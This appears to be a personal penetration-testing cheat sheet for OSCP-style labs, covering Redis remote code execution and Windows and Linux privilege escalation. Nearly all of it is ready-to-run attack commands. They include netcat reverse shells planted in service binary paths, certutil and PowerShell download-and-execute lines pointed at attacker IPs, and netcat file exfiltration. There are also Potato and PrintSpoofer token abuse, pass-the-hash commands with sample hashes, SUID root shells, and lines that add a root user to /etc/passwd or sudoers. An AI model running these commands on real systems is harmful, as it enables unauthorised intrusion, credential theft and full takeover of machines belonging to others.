            - On kali the directory ~/Downloads/GITHUBSTUFF/RedisModules-ExecuteCommand alread has the module.so compiled.
            - upload it to the server, and run this in redis
                > flushall
                > MODULE LOAD /location/of/module.so
                - Execut commands now with
                > system.exec "whoami"
        - master / slave (Works on only version 5.0.9 and lower
            - https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
            > cd ~/Downloads/GITHUBSTUFF/redis-rouge-server
            - start reverse shell
                > nc -nlvp 8080
            - start attack
                > ./redis-rogue-server.py --rhost 192.168.228.69 --lhost 192.168.49.228 --lport 6379
                    - Make sure "lport" is not being used by any other port.
                    - Choose "r"
                    - Choose your IP
                    - Choose 8080 for port

# Host PE 
==================

# Windows PE section
--------------------
*Windows PE Steps*
1) Run the following commands, figure out who you are with rights
    > whoami
    > whoami /priv
        - Look for 
        - SeImpersonatePrivilege, SeAssignPrimaryPrivilege (RoguePotato, JuicyPotato)
        - SeBackupPrivilege (Can extract Hashs (SAM and SYSTEM), then pass the hash)
        - SeRestorePrivilege (Can modify services, overwrite DLLs, modify registry, etc.)
        - SeTakeOwnershipPrivilege (Take ownership of a object (WRITE_OWNER), adjust ACL, and grant write access)
        - Others more advanced
            - SeTcbPrivilege
            - SeCreateTokenPrivilege
            - SeLoadDriverPrivilege
            - SeDebugPrivilege
    > whoami /groups
3) run winpeas
    > certutil.exe -urlcache -split -f http://192.168.19.21:135/winPEASx64.exe C:\Users\xavier\Downloads\winPEASx64.exe
    > .\winpeasany.exe fast searchfast cmd
    - Then run winpeas slow and aggresive to a file
        > .\winpeasany.exe > winpeas.out
4) run systeminfo
    > systeminfo > sysinfo.out
5) Transfer over nc.exe to transfer files back to kali
6) Transfer sysinfo.out, and winpeas.out to kali for further examination
    - netcat (From windows to kali):
        > kali > nc -l -p 4443 > root.txt
        > Windows > nc.exe -w 3 10.10.14.18 4443 < root.txt
7) ru
8) perform a quick look around the following
    - Files in the C:\User\<YOU> folder
    - Check in C:\ (any weird files or folders?)
    - Check in "C:\Program Files" (any weird files or folders?)
    - Check in "C:\Program FilesX86" (any weird files or folders?)
9) Make note of specific ports that are open and available to use!!!
10) Start to dig through every part of whats below to find something vulnerable.
    - try reg exploits / service exploits first
    - search for admin processes, use searchsploit for those processes / applications running
11) If you still cant get escallation, reread through your entier enumeration
12) IF all else fails its time to look into kernel exploits from windows-exploit-suggester

************

## windows manual enumeration:
    - This site is very helpful!!!
        - https://github.com/frizb/Windows-Privilege-Escalation
        - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
    - Check all directoreis of user (Downloads, Documents, Pictures, etc.)!!111
    - Windows cmd commands
        - Search for file
            > where /R c:\ bash.exe
        - Search for a file in current directory and all sub directories
            > dir /s *.py
        - Edit (Does not work everywhere)
            > edit.exe file.txt
        - show first 16 lines of a file
            > type myfile.txt | findstr/n ^^|findstr "^[1-9]: ^1[0-6]:"
        - Information about the user account being used
            - Your name
                > whoami
            - Permissions
                > whoami /priv
            - accesschk.exe (Must upload this to windows to run)
                - Check all services that are in a specific security group
                    > accesschk.exe /accepteula -ucqv * | findstr AUTHORITY\Authenticated
                        - Find any service with "RW"
                - Check permissions on a service (Start, stop or change)
                    > .\accesschk.exe /accepteula -uwcqv user daclsvc
                    > .\accesschk.exe /accepteula -ucqv user * | findstr /i /L /c:"R  " /c:"RW " /c:"W  " /c:"START" /c:"STOP"
                - Check if you can start or stop the service
                    > .\accesschk.exe /accepteula -ucqv user unquotedsvc
                - Check if you have write permissions for each directory in the path
                    > .\accesschk.exe /accepteula -uwdq C:\
                - Check permissions on a registry service
                    > .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
                - Check permissions of executable
                    > .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
                - Check permissions if you can write or append to script
                    > .\accesschk.exe /accepteula -quv user "C:\Devtools\CLeanup.ps1"
                - Check permissions of directory
                    > .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
            - All groups you are apart of (and security groups)
                - Use this link for information on windows groups
                    https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers
                > whoami /groups
            - View same group information from a group policy perspective
                > gpresult /V
                    - search for "The user is a part of the following security groups"
            - Check file permissions (look at groups "medium")
                > dir /q /ad
                > icacls <file>
                - assign integrity level (must be admin)
                    > icacls asd.txt /setintegritylevel(oi)(ci) High
        - Info about other users
            - For yourself
                > net user 
            - For another user
                - Show groups a user is in
                    > net user <username>
                    > gpresult /USER <username> /V 
                    > net user <username> /domain
        - Info about groups built on system
            - List all groups
                > net localgroup
            - View users in group
                > net localgroup groupname
        - IP info
            > ifconfig /all | more
        - Port info
            > netstat -ano
        - Gather windows version
            > powershell -c Get-ComputerInfo -Property "WindowsVersion"
        - Gather System info
            > systeminfo
            > systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
        - Check architecture
            > set pro
            > wmic OS get OSArchitecture
            - In powershell
                > $env:PROCESSOR_ARCHITECTURE
        - Writeable locations
            - Checking integrity levels (look at groups "medium")
                > icacls <file>
                - assign integrity level (must be admin)
                    > icacls asd.txt /setintegritylevel(oi)(ci) High
            - Test where you can write to 
                > echo test > test.txt 
                    - If you get an "Access is denied" you cannot write 
                > icacls C:\folder\to\check
                    - If "BUILTIN\Users" shows "WD" you can write data/add files.
        - service commands
            - Query configuration of service
                > sc qc upnphost
                > sc qc SSDPSRV
                > sc qc SSDPSRV start= auto
            - Query current status of service
                > sc query upnphost
            - Change service
                > sc config upnphost obj= ".\LocalSystem" password= ""
                > sc config upnphost binPath= "C:\Inetpub\nc.exe 192.168.119.135 -nv 4444 -e C:\WINDOWS\System32\cmd.exe"
            - Start or stop service
                > net start upnphost
                > net stop upnphost
        - Check registry for credentials
            > reg query HKLM /f pass /t REG_SZ /s
            - example of output
                HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
                    CurrentPass    REG_SZ    TwilightAirmailMuck234


## Windows auto enumeration:
    - windows-exploit-suggester (kernel)
        - Update database
            > ~/notes/exam/binaries/Windows/_enumeration/windows-exploit-suggester.py -u
        - on windows system show systeminfo and copy to linux machine as a .txt
            > systeminfo
            - copy all of screen output to a file on kali (Example "sysinfo.txt")
        - run windows-exploit-suggester 
            > ~/notes/exam/binaries/Windows/_enumeration/windows-exploit-suggester.py -d 2020-04-06-mssb.xls --systeminfo sysinfo.txt
    - winPEAS
        - run the following regkey to windows cmd to enable colors
            > reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 
        > winpeas.exe > winpeas.out
        - transfer back to kali and run the following to view it
            > less -f -r winpeas.out
                    - Services (search for)
            > cat winpeas.out
    - windows-privesc-check
        > certutil.exe -urlcache -split -f http://192.168.19.21/windows-privesc-check2.exe C:\Users\xavier\Downloads\windows-privesc-check2.exe
        > windows-privesc-check2.exe --audit -a -o wpc-report 
    - Watson
        - Check .NET framework version (highest value listed)
            > reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
        - Check architecture (If ProgramFilesX86 appears its 64 bit)
            - see above for how to look this up
        - Determine if this is Windows 7 or older for verison to compile
        - Open visual studio with .slv watson version
        - Project > Watson Properites > set .NET framework version
        - Build > watson > Configuration Manager
            - Set to release, then x86 (make <new> and copy All CPU)
        - Build > Build Watson
        - Uploadd run on system
    - SharpHound.ps1 (For AD enumeration)
        > . .\SharpHound.ps1
        > Invoke-BloodHound -CollectionMethod All
        > transfer the .bin and .zip file back to Kali
    - Use PowerUp.ps1
        - 64bit via powershell
            > powershell -exec bypass
            > . .\PowerUp.ps1
            > Invoke-AllChecks
        - 64bit via cmd
            > C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -c "iex(new-object net.webclient).downloadstring('http://10.10.14.37/PowerUp.ps1'); Invoke-AllChecks
    - Use Sharpup.exe (precompiled PowerUp)
        > Sharpup.exe
    - Seatbelt.exe (Data gathering)
        > SeatBelt.exe All > seatbelt.out
        - Search for nonstandard processes
            > Seatbelt.exe NonstandardProcesses
    - jaws
        - output to screen 
            > powershell.exe -executionpolicy bypass -file .\jaws-enum.ps1
        - output to file
            > powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws.out

## Windows PE
    - Missconfigured services
        - service level permissions (Change path of service to a different executable)
            - Service levels
                - Useful:
                    - SERVICE_STOP
                    - SERVICE_START
                - Dangerous
                    - SERVICE_CHANGE_CONFIG
                    - SERVICE_ALL_ACCESS 
            - Find a service that has high permissions, can be configured, and can be started / stopped
                - Perform a winpeas scan and search for 
                    > winpeas.exe servicesinfo > winpeas.out
                    - Search for the following, these services maybe crucial to adjust!
                        - "Services Information"
                        - "Modifiable Services"
                - verify
                    - Check the service
                        - .\accesschk.exe /accepteula -uwcqv user daclsvc
                            - Look for "SERVICE_CHANGE_CONFIG, SERVICE_START, SERVICE_STOP"
                            - Check if there are depenencies and if they need to start.
                    - Check configuration
                        - sc qc daclsvc
                            - Look for "SERVICE_START_NAME : Local System" = System user 
                - Once all of this is checked, change the location of "BINARY_PATH_NAME"
                    > sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
                    - Check change
                        > sc qc daclsvc 
                - Start service
                    > net start daclsvc
        - Unquoted service path
            - Example: --> C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
                - Windows will check "C:\Program" first, so create a binary located in "C:\" name "Program"
            > winpeas.exe servicesinfo > winpeas.out
                - Search for the following in winpeas file
                    - "Services Information"
                    - "No\ quotes\ and\ Space\ detected"
                    OR
                    - "Unquoted and space detected"
            - verify
                - Check if you can start or stop the service
                    - .\accesschk.exe /accepteula -ucqv user unquotedsvc
                            - Look for "SERVICE_START, SERVICE_STOP"
                - Check service current state
                    > sc qc unquotedsvc
                        - Look for "SERVICE_START_NAME : Local System" = System user 
                - Check if you have write permissions for each directory in the path
                    - Perform "gpresult /V" to determine which security groups you are apart of.
                    > .\accesschk.exe /accepteula -uwdq C:\
                    > .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
                    > .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
                        - In this dir "Common" = "common.exe"
            - Add a reverse shell service to the path with the specific name
            - Start service
                > net start unquotedsvc
        - Weak registry permissions
            > winpeas.exe servicesinfo > winpeas.out
                - Search for the following in winpeas file
                    - "Services Information"
                    - "modify\ any"
                    - make sure it says "(Interactive [TakeOwnership])"
            - verify
                - accesschk
                    > .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
                - Powershell
                    > powershell -c "Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List"
                - Look for "RW NT AUTHORITY\INTERACTIVE KEY_ALL_ACCESS"
                - Make sure you can start the service
                    > .\accesschk.exe /accepteula -ucqv user regsvc
                        - Look for "SERVICE_START"
                - Check current values in reg entry
                    > reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
                        - Look at "ImagePath" <-- location of binary
                        - Look at "Object Name" <-- priv reg svc will run as 
            - Change path of binary
                > reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse2.exe /f
            - Start registry service
                > net start regsvc
        - Insecure Service Executables (Change file that a service points to)
            > winpeas.exe servicesinfo > winpeas.out
            - Search for the following in winpeas file
                - "Services Information"
                - Search "Everyone" 
                - Make sure it reads "File Permissions: Everyone [AllAccess]"
            - verify
                - Check permissions 
                    > .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
                        - Must have RW Everyone, RW BUILTIN\USERS, or RW <YOUR USERNAME>, but it also must have NT AUTHORITY\SYSTEM and/or BUILTIN\Administrators
                - Check if you can start and stop service
                    > .\accesschk.exe /accepteula -ucqv user filepermsvc
                        - Look for "SERVICE_START"
            - Backup service executable, and copy over reverse shell
                - copy "C:\Program Files\File Permissions Service\filepermservice.exe" ".\filepermservice.exe.backup"
                - copy /Y C:\PrivEsc\reverse2.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
            - Start service executable
                > net start filepermsvc
        - DLL Hijacking
            - Search for the following in winpeas file
                - "Services Information"
                - Search "DLL"
                - Make sure a "DLL Hijacking" folder location is writable and in the windows PATH
                - Looking for a DLL that is loaded by an executable that has high enough permissions. 
                    - If the DLL is writable, we can replace it with a reverse shell
                    - If the DLL is missing, we can substitute its location with a reverse shell
            - Need to look at all "non-Microsoft" services under "Service Information"
                - Determine which ones the user has all START and STOP access to.
                    > .\accesschk.exe /accepteula -ucqv user * | findstr /i /L /c:"R  " /c:"RW " /c:"W  " /c:"START" /c:"STOP"
            - Analyize: Need to copy the binary off the system and test on a test windows system (Same kernel, version, and patches)
                - Use Procmon64.exe to analyize its behavior
                    - Run as administrator
                    - Stop (magnifind glass) and clear (paper with eraser) current output 
                    - CTRL-L (Add filter)
                        - Change "Display enteris matching" to the dllname with extension "dllhijackservice.exe"
                        - Apply, and Ok
                    - Turn off registry and network activity buttons
                    - Start capture again
                    - Start the service
                        > net start dllsvc
                    - Look under "Result" for "NAME NOT FOUND", the associated "PATH" shows the file location and name
                    - LOOK for a path that is equal to the winpeas scan for DLL hijacking. 
            - Create a reverse shell for dll type (see msfvenom dll type)
            - Copy to specific file path for hijacking
            - Start service executable
                > net start dllsvc
    - AutoRuns
        - Search for the following in winpeas file (Can use "autorun" to scan only for it)
            - "Autorun\ Applications
            - Under here look for any application that has FilePerms "Everyone [AllAccess]"
        - verify
            - Query registery for auto run programs
                > reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
            - Check all for permissions
                > .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
                    - Look for permissions for security groups you are in
        - Make a backup of the autorun file
        - Reboot the system with listener running.
    - AlwaysInstallElevated (MSI)
        - Search for the following in winpeas file (Can use "windowscreds" to scan only for it)
            - "AlwaysInstallElevated"
                - Search for "AlwaysInstalledElevated" for HKLM and HKCU
        - verify
            > reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
                - Makesure REG_DWORD = 0x1
            > reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
                - Makesure REG_DWORD = 0x1
        - Create new reverse shell for MSI (see msfvenom section)   
            - This alone will give you the nt system auth you need to priv esc
        - Run the shell
            > msiexec /quiet /qn /i reverse.msi
            - WARNING! This will create an error on windows desktop, if you need to reconnect, you must kill the Windows Installer process
                > tasklist | findstr -I msiexec.exe
                    - Find all PID values
                > Taskkill /PID 2928 /F
                OR
                > wmic process where name='msiexec.exe' delete
            - Once all killed, you can run reverse shell again
    - Passwords
        - Autologin or saved creds
            - Search for the following in winpeas file (Can use "filesinfo" and "userinfo" to scan only for it)
                - "AutoLogon"
                - "Putty"
            - verify
                > reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
                    - "DefaultUser" and "DefaultPassword" (at bottom)
                > reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
            - Access from Kali
                - use winexe
            - Access from windows
                - Use PsExec64.exe 
        - Credential Manager
            - Search for the following in winpeas file (Can use "filesinfo" and "userinfo" to scan only for it)
                - "Credential"
            - verify (Note the actual password will not be listed but if the name shows up, it can be used)
                > cmdkey /list
            - Use the saved creds (In windows)
                > runas /savecred /user:admin C:\PrivEsc\reverse2.exe
        - Search for passwords (Run in current user directory, temp directories, or a suspecious program dir)
            - Recursively search for file in th current directory
                > dir /s *passw* == *.config
            - Recursively search for files in the current directory that contain "password" and end in extensions 
                > findstr /si password *.xml *.ini *.txt
            - C:\Windows\Panther\Unattend.xml usually has a password in base64
                > echo "cGFzc3dvcmQxMjM=" | base64 -d
    - Scheduled Tasks
        - List all tasks
            > schtasks /query /fo LIST /v
        - Check permissions on a script
            > .\accesschk.exe /accepteula -quv user "C:\Devtools\CLeanup.ps1"
        - Append to it
            > echo |set p=/"C:\PrivEsc\reverse2.exe" >> "C:\Devtools\CLeanup.ps1"
    - Admin from GUI
        - Find a symoblic links (Note this is difficult)
            > dir /AL /S C:\ 
               - look for any target "C:\Windows\System32\runas.exe0
        - for paint 
            - File > Open > "file://c:/windows/system32/cmd.exe"
    - Startup Apps
        - verify
            > .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        - Adjsut ~/notes/exam/binaries/Windows/CreateShortcut.vbs to location of reverse shell.exe
            > cscript CreateShortcut.vgs
        - wait for user to login. 

    - For w2k3
        - Use churrasco
            - perform a "whoami /priv" "SeImpersonatePrivilege" must be enabled
            > .\churrasco.exe "cmd.exe"
            > .\churrasco.exe "c:\windows\system32\cmd.exe"
        - Use MS11_46_k8.exe to create user: "k8team" with password: "k8team"
            > .\MS11_46_k8.exe
    - Site of precompiled windows exploits
        - https://github.com/SecWiki/windows-kernel-exploits
    - Create new logon session (need creds for user)
        > runas /user:domain\username cmd.exe
        > runas /user:domain\username /netonly cmd.exe
    - Potatoes!
        - HotPotato: (Will work on windows 7,8, and early version of 10)
            - -ip = current windows ip
            - -cmd = command to run
                > potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
        - JuicyPotato: (Patched on latest versions of Windows10)
            - You must perform "whoami /priv" first, and "SeImpersonatePrivilege" must be enabled (possibly "SeAssignPrimaryToken" as well).
            - Need to check version of Windows with "powershell -c Get-ComputerInfo -Property "WindowsVersion"", if its 1809 or higher, this will not work
            - Go to this site to gather a CLID to use http://ohpe.it/juicy-potato/CLSID/
                - You can also download the "GetCLSID.ps1" and "Join-Object.ps1" to the victim and gather the data with
                    > powershell .\GetCLSID.ps1
            - Check which ports are available to use (Used for -l)
                > netstat -ano
            - Create your reverse shell and listen and run the following command:
            > JuicyPotato.exe -l 5837 -p c:\inetpub\wwwroot\reverseshellpayload.exe -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
            Windows Server 2008
            > JuicyPotato.exe -l 5837 -p c:\ColdFusion8\runtime\bin\rs_x64_win.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
        - RougePotato:
            - You must perform "whoami /priv" first, and "SeImpersonatePrivilege" must be enabled (possibly "SeAssignPrimaryToken" as well).
            - Check which ports are available to use with "netstat -ano" (Will be used for -l in RougePotato.exe)
            - ON KALI: Create a reverse shell with msfvenom, choose available port
            - ON KALI: set up a forwarder to 9999. Make sure "192.168.1.155" is the WINDOWS IP. If you port changes you must chnage in RoguePotato script
                > sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.1.155:9999
            - ON WINDOWS: run rogue potato, assign -l to port used in socat
                > RoguePotato.exe -r 192.168.1.156 -l 9999 -e "C:\PrivEsc\reverse.exe"
    - PrintSpoofer
        - You must perform "whoami /priv" first, and "SeImpersonatePrivilege" must be enabled (possibly "SeAssignPrimaryToken" as well).
        - Must have windows C++ installe
            - verify
                > wmic product get name
        > C:\PrivEsc\PrintSpoofer.exe -i -c "C:\PrivEsc\reverse.exe"
    - PsExec:ping 192.168.147.43

- PE to netcat as user
            > PsExec64.exe -accepteula -u alice -p aliceishere cmd /c "c:\Users\Public\nc.exe 192.168.119.135 80 -e cmd.exe"
        - PE to reverse shell   
            > PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
    - Download files with powershell:
        > powershell -c "(new-object System.Net.WebClient).DownloadFile('wget http://192.168.119.135/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
    - minireverse.ps1 with psexec
        > powershell.exe -c "$user='BUFF\Administrator'; $pass=''; try { Invoke-Command -ScriptBlock { Get-Content C:\Users\Administrator\Desktop\root.txt } -ComputerName BART -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) } catch { echo $_.Exception.Message }" 2>&1
    - pass the hash (From from kali)
        - Example admin hash on windows 2012 --> "Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::"
        - psexec.py
            > psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 administrator@10.10.10.82
        -pth-winexe 
            > pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.135.10 cmd
    - Manually add user to admin group
        > net user /add cooldude password123
        > net localgroup administrators cooldude /add


# Linux PE Section
-------------------
*Linux PE Steps*
1) Run the following commands, figure out who you are with rights
    > whoami
    > id
    > groups
2) work from /dev/shm (usually world writable / readable)
3) run lse and linpeas at the same time to output files

cd /dev/shm
    - wget all the files
chmod +x lse.sh linpeas.sh LinEnum.sh suid3num.py
./lse.sh -l 1 -i 2>&1 > lse.out &
./linpeas.sh 2>&1 > linpeas.out &
./LinEnum.sh 2>&1 > LinEnum.out &
python ./suid3num.py 2>&1 > suid3num.out &
mkdir enum
`mv *.out ./enum
tar -zcvf enum.tar.gz ./enum

4) Check system info
    > hostname
    > uname -a
    > uname -m
    > cat /etc/*release
    > bash --version; sh --version 
    > export -p
5) run linux-exploit-suggester2
    > linux-exploit-suggester2.pl > l-ex-sugg.out
6) perform a quick look around the following
    > ls -las ~
    > ls -las /
    > ls -las /tmp
7) Make note of specific ports that are open and available to use!!!
    > netstat -tulpn 
    - If no netstat
        > grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2))}{print x":"strtonum("0x"substr($3,index($3,":")+1,4))}'
        OR
        > ss -aut
    - Freebsd
        > sockstat -4 -l
    - Use egressbuster.py
8) Try simple exploits first
    - Cron jobs, sudo, version of programs for exports 
9) Look for odd file systems (something gesides ex4)
10) If you still cant get escallation, reread through your entier enumeration
11) IF all else fails its time to look into kernel exploits from windows-exploit-suggester

************
## linux manual enumeration:

    - Linux terminal commands:
        - Information about user account being used
            - Your info
                - Effective id
                    > whoami
                - Print real and effective IDs
                    > id 
            - permissions
                > sudo -l
                    - Anything found can be run as you without a password if listed (sudo /script/found)
                - list all suid and guid binaries
                    > find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 
                - setting the SUID bit
                    > chmod 6555 binary
            - Groups
                - List groups user is in
                    > groups
                - list all groups
                    > cat /etc/group
                - list all users in group
                    - upload "grouping" to system
                    - ./grouping <group>
                    - list all users in each group
                        > for i in $(cat /etc/group | awk -F ":" '{ print$1 }'); do ./grouping $i; done
                - list all users that have a different effective id
                    > for i in $(cat /etc/passwd | awk -F ":" '{print$1}'); do id $i; done | grep euid
        - Info about other users
            - show other users
                - cat /etc/passwd
                    - you can also column the output
                        > column /etc/passwd -t -s ":"
                - groups <username>
        - IP info
            > ifconfig | more
            > ip a
        - Port info
            > netstat -tulpn
            > netstat -peanut
            > netstat -ln
            - If no netstat
                > grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2))}{print x":"strtonum("0x"substr($3,index($3,":")+1,4))}'
                OR
                > ss -aut
            - freebsd
                > socks -4 -l
        - Gather System info
            > hostname
            > uname -a
            > cat /etc/*release
            - Freebsd
                - freebsd-version
                - uname -mrs
        - Check bash version (Look for version < 4.2-048)
            > sh --version
            > csh --version
            > bash --version
            > zsh --version
        - Check architecture
            > uname -m        
        - Find readable and writable directories for user or group
            - find / -user <user> 2>/dev/null
            - find / -group <group> 2>/dev/null
        - Writeable locations
            > find / -type d -writable 2>/dev/null
            > find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
        - Writeable files
            > find -type f -writable -ls
            - In current directory
                > find . -writable
            - Check if there any python binaries you can write to
        - list directories then files
            > ls -la | grep "^d" && ls -la | grep -v "^d"
        - systemd
            - list all systemd running services
                > systemctl list-units --type=service --no-pager
                > systemctl list-units --type=service --state=active --no-pager
            - List all timesr
                > systemctl list-timers --no-pager
                > watch systemctl list-timers --no-pager
            - systemctl status <unit> --no-pager
            - Check for weak file permissions of /bin/systectl
                - You can create a service (Use "revshell.service" in exam/binaries)
                - start service
        - Check crontab
            - This site tells time --> https://crontab.guru/
            - Find all cron jobs
                > cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs /var/spool/anacron /etc/incron.d/* /var/spool/incron/* 2>/dev/null
            - LOOK FOR "/etc/cron.d/ jobs
            - Directories
                - /var/spool/cron/
                - /var/spool/cron/crontabs/
                - /etc/crontab/

                Example of cron job definition:
                .---------------- minute (0 - 59)
                |  .------------- hour (0 - 23)
                |  |  .---------- day of month (1 - 31)
                |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
                |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
                |  |  |  |  |
                *  *  *  *  * user-name  command to be executed

        - Check installed packages
            - On debian (search for all packages with)
                > dpkg -l | grep <program>
            - on centos / rhel / fedora 
                > rpm -qa | grep <program>
            - freebsd
                > pkg info


## linux auto enumeration:
    - New way to read these files!
        > vgm
        - ESC, then type :terminal
        > cat winpeas.out
        - Go back to normal mode Ctrl-w N
        - Close the original vim layout, Ctrl-w w
        - ESC, then type :q

    - linPEAS
        > ./linpeas.sh 2>&1 > linpeas.out &
        - transfer back to kali and run the following to view it
            > less -f -r linpeas.out
            > cat linpeas.out
    - linux-smart-enumeration
        > ./lse.sh 2>&1 > lse.out &
        - transfer back to kali and run the following to view it
            > less -f -r lse.out
            > cat lse.out
        - If all else fails use
            > ./lse.sh -l 1 -i
    - linux package vulns
        - run the following oneliner
            > FILE="packages.txt"; FILEPATH="/tmp/$FILE"; /usr/bin/rpm -q -f /usr/bin/rpm >/dev/null 2>&1; if [ $? -eq 0 ]; then rpm -qa --qf "%{NAME} %{VERSION}\n" | sort -u > $FILEPATH; echo "kernel $(uname -r)" >> $FILEPATH; else dpkg -l | grep ii | awk '{print $2 " " substr($3,1)}' > $FILEPATH; echo "kernel $(uname -r)" >> $FILEPATH; fi; echo ""; echo "[>] Done. Transfer $FILEPATH to your computer and run: "; echo ""; echo "./packages_compare.sh /dev/shm/$FILE"; echo "";
        - Copy the file it generates (/tmp/package.txt) back to your machine (or any machine with searchsploit)
        - Run this script, passing in the filepath:
            > ~/notes/exam/binaries/Linux/_enumeration/vuln_pkg_lookup.sh ./packages.txt > ./packages.txt.found
        - compare
            > vimdiff ./packages.txt ./packages.txt.found
            > :diffoff!
    - Monitor events with "pspy"
        - uplaod to linux host
        > pspy32 
        - watch output
    - suid lookup
        > python ./suid3num.py
    - reverse shell generator (REQUIRES PYTHON3!!)
        > rsg 192.168.1.156 4444
        OR
        > rsg 192.168.1.156 4444 [TYPE]

### Linux PE
    - Taking advantage of a SUID binary
        - run suid3num.py
        - anything under "hell yeah" do the following
            > TF=$(mktemp)
            > echo 'os.execute("/bin/sh")' > $TF
            > /usr/bin/nmap localhost --script=$TF
    - rootshell (Must have some sudo priv, check "sudo -l")
        > cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
        > /tmp/rootbash -p
        OR 
        create a script
            > echo "#!/bin/bash" > givemeroot.sh
            > echo "cp /bin/bash /tmp/rootbash" > givemeroot.sh
            > echo "chmod +s /tmp/rootbash" > givemeroot.sh
            > chmod +x givemeroot.sh
    - custom executable
        - Upload "spawn-shell.c" and compile
        - must use other process to run the binary to spawn a shell
    - Kenel exploit searchsploit criteria example
        > searchsploit linux kernel 2.6.32 priv esc
        - for linux kernel expoits check this site too (all are very old)
            > https://github.com/lucyoa/kernel-exploits
        - Need to make sure you check sources OUTSIDE of exploitdb
    - service exploits
        > ./lse.sh
        - Search for the following in lse file
            - search for "processes"
        - verify
            - Check which processes are running as root
                > ps aux | grep "^root"
                - freeBSD
                    > ps auwwx | grep "^root"
            - Check versions running
                > mysqld --version
    - Weak folder permissions
        - world writeable / executable means other files can be created inside
            - example: "rwxrwxrwx 2 root root 4096 Mar  5 08:29 backup"
            > find / -type d -perm -777 2>/dev/null
    - Weak file permissions
        - Shadow file
            - Check if you can read shadow files
                > ls -l /etc/shadow
                    - make sure "world readable" is enabled
                > freebsd
                    > ls -l /etc/master.passwd
            - Crack shadow hash (see hash cracking for linux section)
        - Create a user
            - edit /etc/passwd, to add your own user with openssl for the password
        - Add user to sudoers file
            - echo the following into the sudoers file
                > echo "username ALL=(ALL) ALL >> /etc/sudoers"
        - Writable files
            - search lse.out for "Writable"
            - verify 
                > ls -l <file name> 
                    - make sure "world writable" is enabled
                - copy all paths to file
                    > for i in $(cat checkfiles.txt); do ls -l $i;done
        - Password files
            - Good info on shadow file
                - https://www.cyberciti.biz/faq/understanding-etcshadow-file/
            - Create a user in /etc/passwd (/etc/passwd must be writable via suid bit)
                - Create hash password
                    > openssl passwd evil
                > echo "evil:HFLcYzgutvecY:0:0:root:/root:/bin/bash" >> /etc/passwd
                - Also try to just delete the "x" for the password field, could possible login with no password
                - NOTE!!! You can use wget (if the suid bit is set) and copy your own passwd file to the system
            - Edit the root user's password  in /etc/shadow (/etc/shadow must be writable)
                - make backup of /etc/shadow
                - Create hash password
                    > mkpasswd -m sha-512 evil
                - Edit the root users hash ( between first and second ":") with new hash
        - Backups
            - search for odd locations for backups ( "/" "~") 
            - search for hidden directories
        - Python libraries
            - Make sure to check paths the current python system uses
                > python -c 'import sys; print "\n".join(sys.path)'
                > python3 -c 'import sys; print("\n".join(sys.path))'
                    - Are any writable for you to use?
                    - edit the imported script in the location
